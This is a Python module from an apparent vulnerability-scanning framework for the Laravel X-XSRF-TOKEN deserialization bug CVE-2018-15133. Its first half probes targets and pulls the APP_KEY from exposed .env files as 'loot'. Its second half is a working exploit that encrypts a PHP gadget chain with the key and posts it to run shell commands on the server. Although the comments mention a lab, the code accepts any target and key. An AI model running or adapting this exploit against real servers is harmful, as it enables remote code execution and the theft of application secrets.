#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2018-15133')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2018-15133 — Laravel <=5.5.40 & 5.6.x <= 5.6.29
X-XSRF-TOKEN Deserialization RCE (SAFE DETECTOR)

Summary:
    A crafted X-XSRF-TOKEN header could trigger unsafe deserialization
    inside Illuminate/Encryption/Encrypter.php → decrypt(), enabling RCE.
    Requires knowledge of APP_KEY, making this a post-compromise exploit.

SAFE DETECTION ONLY:
 ✔ Identifies affected Laravel versions
 ✔ Looks for decrypt()/unserialize() error leaks
 ✔ Detects exposed vendor files
 ✔ Checks for APP_KEY leakage in .env or debug
 ✔ Checks if XSRF token endpoints reveal cipher configuration
 ✘ Does NOT attempt decryption
 ✘ Does NOT send serialized payloads
 ✘ Does NOT attempt exploit

"""

import re
import requests

from modules.core import http_config
from modules.core.http_config import app_url, normalize_base

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# Laravel version regex
LARAVEL_VERSION_PATTERN = re.compile(r"Laravel\s*v?(\d+\.\d+\.\d+)", re.IGNORECASE)

# Decrypt/unserialize error indicators
DECRYPT_ERROR_PATTERNS = [
    r"decrypt\(",
    r"Decryption failed",
    r"The payload is invalid",
    r"unserialize\(",
    r"Unexpected data found",
    r"ErrorException.*decrypt",
    r"Encrypter\.php",
    r"PendingBroadcast",
]

decrypt_re = re.compile("|".join(DECRYPT_ERROR_PATTERNS), re.IGNORECASE)

# Common Laravel key exposure patterns
APP_KEY_PATTERN = re.compile(r"APP_KEY=([A-Za-z0-9+\/=]+)", re.IGNORECASE)


def _safe_get(sess, url, headers=None, timeout=6):
    try:
        return sess.get(url, headers=headers or {}, verify=False, timeout=timeout)
    except Exception:
        return None


def _extract_version(text):
    if not text:
        return None
    m = LARAVEL_VERSION_PATTERN.search(text)
    return m.group(1) if m else None


def _is_vulnerable_version(v):
    """
    Vulnerable:
    - <= 5.5.40
    - 5.6.0 → 5.6.29
    """
    if not v:
        return False

    try:
        major, minor, patch = [int(p) for p in v.split(".")]
    except Exception:
        return False

    if major == 5 and minor == 5 and patch <= 40:
        return True
    if major == 5 and minor == 6 and patch <= 29:
        return True
    return False


def scan(target_url, *, session=None, username=None, password=None, app_key=None, **kwargs):
    """Detect the X-XSRF-TOKEN deserialization sink. `app_key` (when provided) is a key harvested
    earlier this run by an APP_KEY-producer detector (env / cve_2017_16894) and forwarded by the
    detect-all loot-chain. Because this CVE is exploitable IFF the APP_KEY is known, an injected key
    UPGRADES the verdict from "sink present" to "confirmed exploitable now" and is recorded as a
    chained artifact — a real .env -> key -> deserialize-RCE chain, not a cosmetic forward."""
    sess = session or http_config.get_auth_session()
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = normalize_base(target_url)

    result = {
        "cve_id": "CVE-2018-15133",
        "name": "Laravel X-XSRF-TOKEN Deserialization RCE",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "version": None,
        "version_status": "unknown",
        "evidence": [],
        "preconditions": ["affected Laravel version", "known APP_KEY", "X-XSRF-TOKEN decrypt sink reachable"],
        "detection_methods": [],
        "error": None,
    }

    # Loot-chain consumption: a key harvested this run makes exploitation immediately viable.
    # Recorded before the network probes, but APP_KEY alone is not a detection: the target must
    # still expose an affected framework/sink. Otherwise hardened twins with a known lab key
    # become false positives.
    if app_key:
        result["app_key_used"] = app_key
        result["detection_methods"].append("app_key_chained")
        result["evidence"].append(
            f"APP_KEY supplied via loot-chain ({app_key[:12]}…) — key precondition is satisfied, "
            "but exploitability still requires an affected framework and reachable decrypt sink")
        result.setdefault("artifacts", {})["app_key"] = app_key

    # ---------------------------------------------------------
    # Step 1 — Version leakage
    # ---------------------------------------------------------
    main = _safe_get(sess, base)
    if main is not None and main.text:
        ver = _extract_version(main.text)
        if ver:
            result["version"] = ver
            result["evidence"].append(f"Version leak: {ver}")
            result["detection_methods"].append("version_html")

    # Additional endpoints often leak Laravel version
    leak_endpoints = [
        "/login",
        "/_debugbar",
        "/debug",
        "/api",
    ]

    if not result["version"]:
        for ep in leak_endpoints:
            r = _safe_get(sess, app_url(base, ep))
            if r is not None and r.text:
                ver = _extract_version(r.text)
                if ver:
                    result["version"] = ver
                    result["evidence"].append(f"Version found at {ep}: {ver}")
                    result["detection_methods"].append(f"version_leak:{ep}")
                    break

    # ---------------------------------------------------------
    # Step 2 — Detect decrypt()/unserialize() error leakage
    # by sending a harmless bad X-XSRF-TOKEN
    # ---------------------------------------------------------
    xsrf_headers = {"X-XSRF-TOKEN": "AAAA.INVALID.TOKEN"}

    r = _safe_get(sess, base, headers=xsrf_headers)
    if r is not None and decrypt_re.search(r.text or ""):
        result["status"] = "sink_reachable"
        result["verdict"] = "sink_reachable"
        result["proof_type"] = "safe_active"
        result["detection_methods"].append("decrypt_error_leak")
        result["evidence"].append("decrypt()/unserialize() error traces detected")

    # ---------------------------------------------------------
    # Step 3 — Exposed vendor Encrypter.php
    # ---------------------------------------------------------
    vendor_file = app_url(base, "/vendor/laravel/framework/src/Illuminate/Encryption/Encrypter.php")
    v = _safe_get(sess, vendor_file)
    if v is not None and v.status_code == 200 and "decrypt" in (v.text or ""):
        if result["verdict"] == "not_detected":
            result["status"] = "surface_present"
            result["verdict"] = "surface_present"
            result["proof_type"] = "source_disclosure"
        result["detection_methods"].append("vendor_file_exposed")
        result["evidence"].append("Exposed Encrypter.php")

    # ---------------------------------------------------------
    # Step 4 — .env exposure (true APP_KEY disclosure)
    # ---------------------------------------------------------
    if not app_key:
        env = _safe_get(sess, app_url(base, "/.env"))
        if env is not None and env.status_code == 200:
            m = APP_KEY_PATTERN.search(env.text or "")
            if m:
                if result["verdict"] not in {"sink_reachable"}:
                    result["status"] = "precondition_detected"
                    result["verdict"] = "precondition_detected"
                    result["proof_type"] = "app_key_precondition"
                result["detection_methods"].append(".env_exposed")
                result["evidence"].append(f"APP_KEY exposed: {m.group(1)}")
                result.setdefault("artifacts", {})["app_key"] = m.group(1)

    # ---------------------------------------------------------
    # Step 5 — Version-based evaluation
    # ---------------------------------------------------------
    if result["version"]:
        if _is_vulnerable_version(result["version"]):
            result["version_status"] = "vulnerable"
            if result["verdict"] in {"not_detected", "surface_present"}:
                result["status"] = "version_applicable"
                result["verdict"] = "version_applicable"
                result["proof_type"] = "version"
        else:
            result["version_status"] = "patched"
            if result["verdict"] not in {"sink_reachable", "precondition_detected"}:
                result["status"] = "blocked_by_control"
                result["verdict"] = "blocked_by_control"

    if app_key and result["verdict"] in {"sink_reachable", "version_applicable"}:
        result["status"] = "precondition_detected"
        result["verdict"] = "precondition_detected"
        result["proof_type"] = "app_key_precondition"

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2018-15133 exploitation half — Laravel X-XSRF-TOKEN deserialization RCE.

Split from the original modules/cve_2018_15133.py (detection half:
modules/cves/cve_2018_15133.py). Exploitation may import from modules root
(shared infra) and modules.detection.
"""

import hashlib
import hmac

import requests

from modules.core import http_config
from modules.core.http_config import app_url, normalize_base
from modules.helpers.pipeline import is_forced_execution

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


# =============================================================================
# EXPLOIT (per /tmp/EXPLOIT_CONTRACT.md) — deserialize_rce, command-capable,
# app_key-gated, unauthenticated.
#
# CVE-2018-15133 is unauthenticated RCE *given a known APP_KEY* (chained from
# CVE-2017-16894 .env exposure). Illuminate\Encryption\Encrypter::decrypt()
# decrypts the AES-256-CBC + HMAC-SHA256 X-XSRF-TOKEN, then calls
# unserialize() on the plaintext with no class allow-list. We craft a properly
# MAC'd token whose plaintext is a phpggc Laravel/RCE2 gadget
# (PendingBroadcast -> Illuminate\Events\Dispatcher -> call_user_func) and POST
# it to the lab's /decrypt-token sink. The gadget's __destruct runs
# system($command) during unserialize(), reflecting stdout inline in the body.
#
# Pure-HTTP: the serialized PHP gadget is hand-built in Python (no phpggc / no
# PHP CLI / no docker exec). AES-256-CBC needs `cryptography`; if absent we
# refuse honestly (no fabrication).
# =============================================================================

# Lab's baked-in fixed APP_KEY (32 NUL bytes, base64). Documented precondition:
# in the real world this is whatever leaked APP_KEY the attacker obtained.
_LAB_APP_KEY_B64 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

# Laravel 5.6 cipher.
_CIPHER = "AES-256-CBC"

# Reflected-RCE proof markers (the gadget runs system(command) and its stdout
# is emitted inline before the trailing 500/JSON error frame).
_RCE_MARKERS = ("uid=", "gid=", "groups=", "Linux ", "GNU/Linux", "root:x:")


from modules.generators.php_gadgets import build_rce2 as build_rce2_gadget


def laravel_encrypt(plaintext: bytes, app_key_b64: str) -> str:
    """Encrypt *plaintext* into a Laravel X-XSRF-TOKEN value.

    Format: base64( JSON{"iv":b64,"value":b64,"mac":hex} ) where
    mac = HMAC-SHA256(key, iv_b64 + value_b64). Matches Encrypter::encrypt for
    Laravel 5.6 (AES-256-CBC). Raises ImportError if `cryptography` is missing.
    """
    import base64
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sym_padding
    from cryptography.hazmat.backends import default_backend

    key = base64.b64decode(app_key_b64)
    # Deterministic IV via os.urandom (sandbox-safe; randomness not required for
    # correctness — only uniqueness).
    import os as _os
    iv = _os.urandom(16)

    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(plaintext) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    ciphertext = enc.update(padded) + enc.finalize()

    iv_b64 = base64.b64encode(iv).decode()
    value_b64 = base64.b64encode(ciphertext).decode()
    mac = hmac.new(key, (iv_b64 + value_b64).encode(), hashlib.sha256).hexdigest()

    import json as _json
    payload = _json.dumps({"iv": iv_b64, "value": value_b64, "mac": mac})
    return base64.b64encode(payload.encode()).decode()


def _normalize_key(raw):
    """Accept a raw or 'base64:'-prefixed APP_KEY; return the base64 body."""
    if not raw:
        return None
    raw = raw.strip()
    if raw.startswith("base64:"):
        raw = raw[len("base64:"):]
    return raw


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None, **kwargs):
    """Attempt CVE-2018-15133 deserialization RCE over pure HTTP.

    deserialize_rce / command-capable / app_key-gated / unauthenticated.
    Returns the contract dict; never raises.
    """
    options = options or {}
    forced = is_forced_execution(options, **kwargs)
    sess = session or http_config.get_auth_session()
    cmd = command or "echo CVE-2018-15133 PoC && id && hostname"

    result = {
        "cve": "CVE-2018-15133",
        "attempted": True,
        "success": False,
        "vuln_class": "deserialize_rce",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    # --- normalize target ---
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url
    base = normalize_base(target_url)

    # --- crypto dependency check (no fabrication if missing) ---
    try:
        import cryptography  # noqa: F401
    except Exception:
        result["requires"] = ["python:cryptography", "app_key"]
        result["reason"] = (
            "exploitation needs AES-256-CBC (pip install cryptography); "
            "package unavailable in this environment"
        )
        result["detail"] = "cannot craft encrypted token without cryptography"
        return result

    # --- APP_KEY (documented precondition) ---
    app_key = _normalize_key(options.get("app_key"))
    if not app_key:
        result["attempted"] = forced
        result["requires"] = ["app_key"]
        result["reason"] = "APP_KEY required; pass --app-key explicitly"
        result["detail"] = (
            "forced execution reached APP_KEY material precondition; no APP_KEY supplied"
            if forced else "no APP_KEY supplied"
        )
        return result
    used_lab_default = app_key == _LAB_APP_KEY_B64
    # always honest that a known APP_KEY is the gating precondition
    result["requires"] = ["app_key"]

    # --- build gadget + token ---
    try:
        gadget = build_rce2_gadget(cmd)
        token = laravel_encrypt(gadget, app_key)
    except Exception as e:
        result["reason"] = "payload/crypto build failed: %s" % e
        result["detail"] = "could not construct encrypted gadget token"
        return result

    result["artifacts"] = {
        "sink": app_url(base, "/decrypt-token"),
        "header": "X-XSRF-TOKEN",
        "chain": "Laravel/RCE2 (PendingBroadcast -> Dispatcher -> call_user_func)",
        "app_key_b64": app_key,
        "app_key_source": "lab-default" if used_lab_default else "options",
        "gadget_len": len(gadget),
        "token_preview": token[:64] + "...",
        "command": cmd,
    }

    # --- fire at the unserialize sink ---
    headers = {
        "X-XSRF-TOKEN": token,
        "Content-Type": "application/json",
        "Accept": "application/json",
        "User-Agent": http_config.BROWSER_USER_AGENT,
        "X-lvcscan": "CVE-2018-15133",
    }
    # The authentic unserialize sink is POST /decrypt-token (calls
    # Crypt::decrypt(X-XSRF-TOKEN) with $unserialize=true). The homepage CSRF
    # cookie path uses decrypt(..., false) on 5.6 and does NOT unserialize, so
    # we do not fall back to "/" (it would only pollute the failure evidence).
    body = ""
    status = None
    try:
        r = sess.post(app_url(base, "/decrypt-token"), headers=headers,
                      verify=False, timeout=20)
        body = r.text or ""
        status = r.status_code
    except Exception as e:
        result["reason"] = "target unreachable: %s" % e
        result["detail"] = "no HTTP response from /decrypt-token sink"
        return result

    # --- adjudicate: reflected command output == proven RCE ---
    if any(m in body for m in _RCE_MARKERS):
        # capture the reflected output region (strip the trailing JSON error frame)
        snippet = body
        brace = snippet.find("\n{")
        if brace == -1:
            brace = snippet.find("{\n")
        head = snippet[:brace] if brace > 0 else snippet[:400]
        head = head.strip() or snippet[:400].strip()
        result["success"] = True
        result["evidence"] = head[:1000]
        result["detail"] = (
            "RCE2 gadget detonated via /decrypt-token; system(%r) output "
            "reflected inline (HTTP %s)" % (cmd, status)
        )
        return result

    # --- failed: gadget sent, no reflected output ---
    result["success"] = False
    result["detail"] = (
        "encrypted gadget accepted by sink but no reflected command output "
        "(HTTP %s)" % status
    )
    result["reason"] = (
        "no command output in response body; possible patched Encrypter "
        "(no unserialize), wrong APP_KEY, missing /decrypt-token sink, or "
        "egress-only blind sink. Evidence excerpt: %s" % (body[:300])
    )
    return result
